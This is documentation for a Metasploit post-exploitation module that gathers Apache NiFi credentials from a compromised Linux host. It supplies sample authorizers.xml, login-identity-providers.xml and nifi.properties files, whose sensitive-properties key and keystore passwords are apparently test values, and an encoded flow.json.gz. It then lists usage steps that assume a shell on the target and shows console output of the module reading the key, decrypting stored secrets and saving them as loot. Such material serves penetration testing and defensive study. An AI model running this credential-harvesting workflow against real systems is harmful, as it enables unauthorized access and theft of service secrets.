## Vulnerable Application

This module will grab Apache NiFi credentials from various files on Linux.

It uses the following files:

1. `authorizers.xml` to pull information about external authorizers such as Azure Active Directory
2. `login-identity-providers.xml` to pull any single user credential (password is hashed)
3. `nifi.properties` to determine encryption algorithm and key for the last file:
4. `flow.json.gz` to pull any flow and server encrypted credentials

To test this module, you'll need the previous files. NiFi can be installed, and the values all set
however the instructions to do such are rather long. Samples of those files can be used and all placed
in the `conf` folder:

### authorizers.xml

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<authorizers>
    <userGroupProvider>
        <identifier>file-user-group-provider</identifier>
        <class>org.apache.nifi.authorization.FileUserGroupProvider</class>
        <property name="Users File">./conf/users.xml</property>
        <property name="Legacy Authorized Users File"></property>

        <property name="Initial User Identity 1"></property>
    </userGroupProvider>


    <accessPolicyProvider>
        <identifier>file-access-policy-provider</identifier>
        <class>org.apache.nifi.authorization.FileAccessPolicyProvider</class>
        <property name="User Group Provider">file-user-group-provider</property>
        <property name="Authorizations File">./conf/authorizations.xml</property>
        <property name="Initial Admin Identity"></property>
        <property name="Legacy Authorized Users File"></property>
        <property name="Node Identity 1"></property>
        <property name="Node Group"></property>
    </accessPolicyProvider>

    <authorizer>
        <identifier>managed-authorizer</identifier>
        <class>org.apache.nifi.authorization.StandardManagedAuthorizer</class>
        <property name="Access Policy Provider">file-access-policy-provider</property>
    </authorizer>

    <authorizer>
        <identifier>single-user-authorizer</identifier>
        <class>org.apache.nifi.authorization.single.user.SingleUserAuthorizer</class>
    </authorizer>

    <!--
        From: https://github.com/benkelly/NiFi-Authentication-with-Azure-Active-Directory-Setup-Guide#configuring-nifi-for-aad-auth
    -->

    <userGroupProvider>
        <identifier>aad-user-group-provider</identifier>
        <class>org.apache.nifi.authorization.azure.AzureGraphUserGroupProvider</class>
        <property name="Refresh Delay">5 mins</property>
        <property name="Authority Endpoint">https://login.microsoftonline.com</property>
        <property name="Directory ID">YOUR_TENANT_ID</property>
        <property name="Application ID">YOUR_APPLICATION_CLIENT_ID</property>
        <property name="Client Secret">YOUR_APPLICATION_CLIENT_SECRET</property>
        <property name="Group Filter Prefix">Nifi-AAD</property>
        <property name="Page Size">100</property>
    </userGroupProvider>
</authorizers>

```

### login-identity-providers.xml

```xml
<loginIdentityProviders>
    <!--
        Generated with: ./nifi.sh set-single-user-credentials USERNAME PASSWORDPASSWORD
    -->
    <provider>
        <identifier>single-user-provider</identifier>
        <class>org.apache.nifi.authentication.single.user.SingleUserLoginIdentityProvider</class>
        <property name="Username">USERNAME</property>
        <property name="Password">$2b$12$53nHe2KpVIvWUVwaZft/1.2zOoSxfBkl4pIOXaIoC0QisaYJIZQBe</property>
    </provider>
</loginIdentityProviders>
```

### nifi.properties

```ini
# Core Properties #
nifi.flow.configuration.file=./conf/flow.xml.gz
nifi.flow.configuration.json.file=./conf/flow.json.gz
nifi.flow.configuration.archive.enabled=true
nifi.flow.configuration.archive.dir=./conf/archive/
nifi.flow.configuration.archive.max.time=30 days
nifi.flow.configuration.archive.max.storage=500 MB
nifi.flow.configuration.archive.max.count=
nifi.flowcontroller.autoResumeState=true
nifi.flowcontroller.graceful.shutdown.period=10 sec
nifi.flowservice.writedelay.interval=500 ms
nifi.administrative.yield.duration=30 sec
# If a component has no work to do (is "bored"), how long should we wait before checking again for work?
nifi.bored.yield.duration=10 millis
nifi.queue.backpressure.count=10000
nifi.queue.backpressure.size=1 GB

nifi.authorizer.configuration.file=./conf/authorizers.xml
nifi.login.identity.provider.configuration.file=./conf/login-identity-providers.xml
nifi.templates.directory=./conf/templates
nifi.ui.banner.text=
nifi.ui.autorefresh.interval=30 sec
nifi.nar.library.directory=./lib
nifi.nar.library.autoload.directory=./extensions
nifi.nar.working.directory=./work/nar/
nifi.documentation.working.directory=./work/docs/components
nifi.nar.unpack.uber.jar=false

nifi.state.management.configuration.file=./conf/state-management.xml
nifi.state.management.provider.local=local-provider
nifi.state.management.provider.cluster=zk-provider
nifi.state.management.embedded.zookeeper.start=false
nifi.state.management.embedded.zookeeper.properties=./conf/zookeeper.properties

# H2 Settings
nifi.database.directory=./database_repository
nifi.h2.url.append=;LOCK_TIMEOUT=25000;WRITE_DELAY=0;AUTO_SERVER=FALSE

# Repository Encryption properties override individual repository implementation properties
nifi.repository.encryption.protocol.version=
nifi.repository.encryption.key.id=
nifi.repository.encryption.key.provider=
nifi.repository.encryption.key.provider.keystore.location=
nifi.repository.encryption.key.provider.keystore.password=

# FlowFile Repository
nifi.flowfile.repository.implementation=org.apache.nifi.controller.repository.WriteAheadFlowFileRepository
nifi.flowfile.repository.wal.implementation=org.apache.nifi.wali.SequentialAccessWriteAheadLog
nifi.flowfile.repository.directory=./flowfile_repository
nifi.flowfile.repository.checkpoint.interval=20 secs
nifi.flowfile.repository.always.sync=false
nifi.flowfile.repository.retain.orphaned.flowfiles=true

nifi.swap.manager.implementation=org.apache.nifi.controller.FileSystemSwapManager
nifi.queue.swap.threshold=20000

# Content Repository
nifi.content.repository.implementation=org.apache.nifi.controller.repository.FileSystemRepository
nifi.content.claim.max.appendable.size=50 KB
nifi.content.repository.directory.default=./content_repository
nifi.content.repository.archive.max.retention.period=7 days
nifi.content.repository.archive.max.usage.percentage=50%
nifi.content.repository.archive.enabled=true
nifi.content.repository.always.sync=false
nifi.content.viewer.url=../nifi-content-viewer/

# Provenance Repository Properties
nifi.provenance.repository.implementation=org.apache.nifi.provenance.WriteAheadProvenanceRepository

# Persistent Provenance Repository Properties
nifi.provenance.repository.directory.default=./provenance_repository
nifi.provenance.repository.max.storage.time=30 days
nifi.provenance.repository.max.storage.size=10 GB
nifi.provenance.repository.rollover.time=10 mins
nifi.provenance.repository.rollover.size=100 MB
nifi.provenance.repository.query.threads=2
nifi.provenance.repository.index.threads=2
nifi.provenance.repository.compress.on.rollover=true
nifi.provenance.repository.always.sync=false
nifi.provenance.repository.indexed.fields=EventType, FlowFileUUID, Filename, ProcessorID, Relationship
nifi.provenance.repository.indexed.attributes=
nifi.provenance.repository.index.shard.size=500 MB
nifi.provenance.repository.max.attribute.length=65536
nifi.provenance.repository.concurrent.merge.threads=2


# Volatile Provenance Respository Properties
nifi.provenance.repository.buffer.size=100000

# Component and Node Status History Repository
nifi.components.status.repository.implementation=org.apache.nifi.controller.status.history.VolatileComponentStatusRepository

# Volatile Status History Repository Properties
nifi.components.status.repository.buffer.size=1440
nifi.components.status.snapshot.frequency=1 min

# QuestDB Status History Repository Properties
nifi.status.repository.questdb.persist.node.days=14
nifi.status.repository.questdb.persist.component.days=3
nifi.status.repository.questdb.persist.location=./status_repository

# Site to Site properties
nifi.remote.input.host=
nifi.remote.input.secure=true
nifi.remote.input.socket.port=
nifi.remote.input.http.enabled=true
nifi.remote.input.http.transaction.ttl=30 sec
nifi.remote.contents.cache.expiration=30 secs

# web properties #
#############################################

# For security, NiFi will present the UI on 127.0.0.1 and only be accessible through this loopback interface.
# Be aware that changing these properties may affect how your instance can be accessed without any restriction.
# We recommend configuring HTTPS instead. The administrators guide provides instructions on how to do this.

nifi.web.http.host=
nifi.web.http.port=
nifi.web.http.network.interface.default=

#############################################

nifi.web.https.host=127.0.0.1
nifi.web.https.port=8443
nifi.web.https.network.interface.default=
nifi.web.https.application.protocols=http/1.1
nifi.web.jetty.working.directory=./work/jetty
nifi.web.jetty.threads=200
nifi.web.max.header.size=16 KB
nifi.web.proxy.context.path=
nifi.web.proxy.host=
nifi.web.max.content.size=
nifi.web.max.requests.per.second=30000
nifi.web.max.access.token.requests.per.second=25
nifi.web.request.timeout=60 secs
nifi.web.request.ip.whitelist=
nifi.web.should.send.server.version=true
nifi.web.request.log.format=%{client}a - %u %t "%r" %s %O "%{Referer}i" "%{User-Agent}i"

# Filter JMX MBeans available through the System Diagnostics REST API
nifi.web.jmx.metrics.allowed.filter.pattern=

# Include or Exclude TLS Cipher Suites for HTTPS
nifi.web.https.ciphersuites.include=
nifi.web.https.ciphersuites.exclude=

# security properties #
nifi.sensitive.props.key=pVTBP82AE+ter4iTwZQK7IoYwljtRDVw
nifi.sensitive.props.key.protected=
nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256
nifi.sensitive.props.additional.keys=

nifi.security.autoreload.enabled=false
nifi.security.autoreload.interval=10 secs
nifi.security.keystore=./conf/keystore.p12
nifi.security.keystoreType=PKCS12
nifi.security.keystorePasswd=7fe294b206855e0790d0a198192c3c76
nifi.security.keyPasswd=7fe294b206855e0790d0a198192c3c76
nifi.security.truststore=./conf/truststore.p12
nifi.security.truststoreType=PKCS12
nifi.security.truststorePasswd=92691561806e0d5f8ace0e81289a320a
nifi.security.user.authorizer=single-user-authorizer
nifi.security.allow.anonymous.authentication=false
nifi.security.user.login.identity.provider=single-user-provider
nifi.security.user.jws.key.rotation.period=PT1H
nifi.security.ocsp.responder.url=
nifi.security.ocsp.responder.certificate=

# OpenId Connect SSO Properties #
nifi.security.user.oidc.discovery.url=
nifi.security.user.oidc.connect.timeout=5 secs
nifi.security.user.oidc.read.timeout=5 secs
nifi.security.user.oidc.client.id=
nifi.security.user.oidc.client.secret=
nifi.security.user.oidc.preferred.jwsalgorithm=
nifi.security.user.oidc.additional.scopes=offline_access
nifi.security.user.oidc.claim.identifying.user=
nifi.security.user.oidc.fallback.claims.identifying.user=
nifi.security.user.oidc.claim.groups=groups
nifi.security.user.oidc.truststore.strategy=JDK
nifi.security.user.oidc.token.refresh.window=60 secs

# Apache Knox SSO Properties #
nifi.security.user.knox.url=
nifi.security.user.knox.publicKey=
nifi.security.user.knox.cookieName=hadoop-jwt
nifi.security.user.knox.audiences=

# SAML Properties #
nifi.security.user.saml.idp.metadata.url=
nifi.security.user.saml.sp.entity.id=
nifi.security.user.saml.identity.attribute.name=
nifi.security.user.saml.group.attribute.name=
nifi.security.user.saml.request.signing.enabled=false
nifi.security.user.saml.want.assertions.signed=true
nifi.security.user.saml.signature.algorithm=http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
nifi.security.user.saml.authentication.expiration=12 hours
nifi.security.user.saml.single.logout.enabled=false
nifi.security.user.saml.http.client.truststore.strategy=JDK
nifi.security.user.saml.http.client.connect.timeout=30 secs
nifi.security.user.saml.http.client.read.timeout=30 secs

nifi.listener.bootstrap.port=0

# cluster common properties (all nodes must have same values) #
nifi.cluster.protocol.heartbeat.interval=5 sec
nifi.cluster.protocol.heartbeat.missable.max=8
nifi.cluster.protocol.is.secure=false

# cluster node properties (only configure for cluster nodes) #
nifi.cluster.is.node=false
nifi.cluster.node.address=
nifi.cluster.node.protocol.port=
nifi.cluster.node.protocol.max.threads=50
nifi.cluster.node.event.history.size=25
nifi.cluster.node.connection.timeout=5 sec
nifi.cluster.node.read.timeout=5 sec
nifi.cluster.node.max.concurrent.requests=100
nifi.cluster.firewall.file=
nifi.cluster.flow.election.max.wait.time=5 mins
nifi.cluster.flow.election.max.candidates=

# cluster load balancing properties #
nifi.cluster.load.balance.host=
nifi.cluster.load.balance.port=6342
nifi.cluster.load.balance.connections.per.node=1
nifi.cluster.load.balance.max.thread.count=8
nifi.cluster.load.balance.comms.timeout=30 sec

# zookeeper properties, used for cluster management #
nifi.zookeeper.connect.string=
nifi.zookeeper.connect.timeout=10 secs
nifi.zookeeper.session.timeout=10 secs
nifi.zookeeper.root.node=/nifi
nifi.zookeeper.client.secure=false
nifi.zookeeper.security.keystore=
nifi.zookeeper.security.keystoreType=
nifi.zookeeper.security.keystorePasswd=
nifi.zookeeper.security.truststore=
nifi.zookeeper.security.truststoreType=
nifi.zookeeper.security.truststorePasswd=
nifi.zookeeper.jute.maxbuffer=

nifi.zookeeper.auth.type=
nifi.zookeeper.kerberos.removeHostFromPrincipal=
nifi.zookeeper.kerberos.removeRealmFromPrincipal=

# kerberos #
nifi.kerberos.krb5.file=

# kerberos service principal #
nifi.kerberos.service.principal=
nifi.kerberos.service.keytab.location=

# kerberos spnego principal #
nifi.kerberos.spnego.principal=
nifi.kerberos.spnego.keytab.location=
nifi.kerberos.spnego.authentication.expiration=12 hours

# external properties files for variable registry
# supports a comma delimited list of file locations
nifi.variable.registry.properties=

# analytics properties #
nifi.analytics.predict.enabled=false
nifi.analytics.predict.interval=3 mins
nifi.analytics.query.interval=5 mins
nifi.analytics.connection.model.implementation=org.apache.nifi.controller.status.analytics.models.OrdinaryLeastSquares
nifi.analytics.connection.model.score.name=rSquared
nifi.analytics.connection.model.score.threshold=.90

# runtime monitoring properties
nifi.monitor.long.running.task.schedule=
nifi.monitor.long.running.task.threshold=

# Enable automatic diagnostic at shutdown.
nifi.diagnostics.on.shutdown.enabled=false

# Include verbose diagnostic information.
nifi.diagnostics.on.shutdown.verbose=false

# The location of the diagnostics folder.
nifi.diagnostics.on.shutdown.directory=./diagnostics

# The maximum number of files permitted in the directory. If the limit is exceeded, the oldest files are deleted.
nifi.diagnostics.on.shutdown.max.filecount=10

# The diagnostics folder's maximum permitted size in bytes. If the limit is exceeded, the oldest files are deleted.
nifi.diagnostics.on.shutdown.max.directory.size=10 MB

nifi.performance.tracking.percentage=0
```

### flow.json.gz

This file is base64 encoded

```
H4sIAAAAAAAAAJVV227iSBD9lcjPMdO2Adu8kWAySAQQl0Ta1SjqSzn0xLitdpvARPn3rTY2YbPZ
HW0eEndVdXWdU1Unbw7kXAmZPz+ALqXKncGbs6M/lT6f/WtnJ/MLA3lHCz2s5Q70SMs95OutBipu
VZUbZ+CR2p2g3XzlvnY0PMvSaAmlM/jzx7VTUE13YEDfqtzAwXw2L7TaS4HPn+wco7TKMtAr0HvJ
2zQaCqUNQlnT8qWxGdgVGTXnEKXMnVZVYWFiytzIVIJ2Bk6fdhnhDNzUZ7EbxCF1WUzxS7CQ97qx
YDR0rh2Zl4bmHCaXdyMSeF2vH7nEi5jrEUJc5ne7+Cvo+z3Cuj6J8W6OaDB6JsfyapypV8dC2e0w
EVbn4KlQpTRNDw7IcweZPNZ/kfFCK0Ra1tWfAe+UgcU/HU2sqhn7BBRIFMRe4LuMhZEbAAtc6tO+
y70w7rG+gB7r/gfQyE99/wKo8GPhxiLw427qBSzsfQBdb2U5KYe3VWnUbmZtvwHcJ14DOQjiGrQ5
FjaT0s8dWlC+hU6OtXQ+8HVslYJq0bkD8329XmBWVuUiA5vz+dTqz/cxhuKgpJTjPDrW4rZp3Jxq
dO/bWXe8jh90fOfUgALwmp2lN+ReSA3cuFypFwluoTLJsXJHQEqrzGCSzXKK560xxeDbN88PO9jI
jocOHPMcr+IDV3aJVGXLCMhVCRy9I2roV/ZNCbphFufZVO3x2hnjMqjXq2VTkiU3pVlpXQtalq9K
C9v4nL+FISWCeH6UEoCoy/o8CsMe97wg7KWMBqQfpZ7fJ1RQxoIoEizoeaTnBZwGIo5AkJBFEPew
82FEIaY+5xAw9n5B0HEEJdeyMPX4vaGjNMe6H/YTeyCqDJd0AVoqW1eL78O1MhpX9tmyuZ7cJ8un
0XLykMwwBg7AK0vcTAlLxHA6tWMEOc3w3Qqvnbp2Ju0oIRMXDq+xswr1A7ViCnvI0P44XNr8usrb
4HuZZRIBkFpweKU1zm12XJ2qpCwDKzMfokYro9agUSqxdrGErM5SbmW7lA0+ECuDEfhmMhveTJOR
fRaMPl7Ipz3LL5Mwyl9Umt4D39JcljtMs8A808kfydN4On8cT6aJU+vvzSnyTLNHrrC28rSDhcoR
zfq0XYvl/DZZreZL9NUbM/nfwvj+wypGUZkFKnBTKo7v3w38PPaNAVmErPlOK3Rmv1H4PdXSMt/M
VbNqVkvHMoPkUMhzo9sBaGIsGwuNmlFpmLOfWIb9p1RuVSYs5fjzZajdxZX8BRfBOEJ3N//O4tPd
cr6xKpQ2Vd22w1Orw2Z2M9/MRnXX24h5ZRj2XixaCVmtl8nw/unxezJ7Gj4MJ1M7J877+1/P560I
rQcAAA==
```

## Verification Steps

1. Install the files, or install NiFi and configure some credential things
1. Start msfconsole
1. Get a shell on the NiFi system with permission to read the conf files
1. Do: `use linux/gather/nifi_credentials`
1. Do: `set session [#]`
1. Do: `set NIFI_PATH [path]` or `NIFI_PROPERTIES`, `NIFI_FLOW_JSON`, `NIFI_IDENTITY`, and `NIFI_AUTHORIZERS`
1. Do: `run`
1. You should get any credentials stored by the system

## Options

### NIFI_PATH

The path to the NiFi folder. If the various files are not found in this directory's `conf` folder,
the following Options are used to find the files directly. Defaults to `/opt/nifi/`

### NIFI_PROPERTIES

NiFi Properties file (`nifi.properties`), if not found in `NIFI_PATH`. Defaults to `/opt/nifi/conf/nifi.properties`

### NIFI_FLOW_JSON

NiFi `flow.json.gz` file, if not found in `NIFI_PATH`. Defaults to `/opt/nifi/conf/flow.json.gz`

### NIFI_IDENTITY

NiFi `login-identity-providers.xml` file, if not found in `NIFI_PATH`. Defaults to `/opt/nifi/conf/login-identity-providers.xml`

### NIFI_AUTHORIZERS

NiFi authorizers file (`authorizers.xml`), if not found in `NIFI_PATH`. Defaults to `/opt/nifi/conf/authorizers.xml`

## Scenarios

### Nifi 1.23.2 Using Configuration Files Included in Markdown

```
[msf](Jobs:0 Agents:1) post(linux/gather/nifi_credentials) > run

[-] /opt/nifi/conf/flow.json.gz not found
[*] Found flow.json.gz file /opt/nifi-1.23.2/nifi-1.23.2//conf/flow.json.gz
[+] /opt/nifi-1.23.2/nifi-1.23.2//conf/flow.json.gz is readable!
[-] /opt/nifi/conf/nifi.properties not found
[*] Found nifi.properties file /opt/nifi-1.23.2/nifi-1.23.2//conf/nifi.properties
[+] /opt/nifi-1.23.2/nifi-1.23.2//conf/nifi.properties is readable!
[+] properties data saved in: /home/h00die/.msf4/loot/20231106144709_default_192.168.2.243_nifi.properties_402421.txt
[+] Key: pVTBP82AE+ter4iTwZQK7IoYwljtRDVw
[+] Encrypted data saved in: /home/h00die/.msf4/loot/20231106144711_default_192.168.2.243_nifi.flow.json_650473.json
[*] Checking root group processors
[*]   Analyzing  of type org.apache.nifi.processors.standard.GetHTTP
[*]     Decryption initiated for AES-256-GCM
[*]       Nonce: 77a0d0128f0ee84b6c8775c11375fba3, Auth Tag: 3ca3d98ed07b8e9500078ae9a2cce3bb, Ciphertext: 068f1260adabb388db351051
[*] Checking root group controller services
[+] Decrypted data saved in: /home/h00die/.msf4/loot/20231106144711_default_192.168.2.243_nifi.flow.decryp_491289.json
[*] Checking identity file
[-] /opt/nifi/conf/login-identity-providers.xml not found
[*] Found login-identity-providers.xml file /opt/nifi-1.23.2/nifi-1.23.2//conf/login-identity-providers.xml
[+] /opt/nifi-1.23.2/nifi-1.23.2//conf/login-identity-providers.xml is readable!
[*] Checking authorizers file
[-] /opt/nifi/conf/authorizers.xml not found
[*] Found authorizers.xml file /opt/nifi-1.23.2/nifi-1.23.2//conf/authorizers.xml
[+] /opt/nifi-1.23.2/nifi-1.23.2//conf/authorizers.xml is readable!
[+] NiFi Flow Values
NiFi Flow Data
==============

 Name                     Username                                                                         Password                                                      Other Information
 ----                     --------                                                                         --------                                                      -----------------
 ThisIsACustomName        testusername                                                                     testpassword                                                  URL: http://127.0.0.1
 aad-user-group-provider  Directory/Tenant ID: YOUR_TENANT_ID, Application ID: YOUR_APPLICATION_CLIENT_ID  YOUR_APPLICATION_CLIENT_SECRET                                From authorizers.xml
 single-user-provider     USERNAME                                                                         $2b$12$53nHe2KpVIvWUVwaZft/1.2zOoSxfBkl4pIOXaIoC0QisaYJIZQBe  From login-identity-providers.xml

[*] Post module execution completed
```
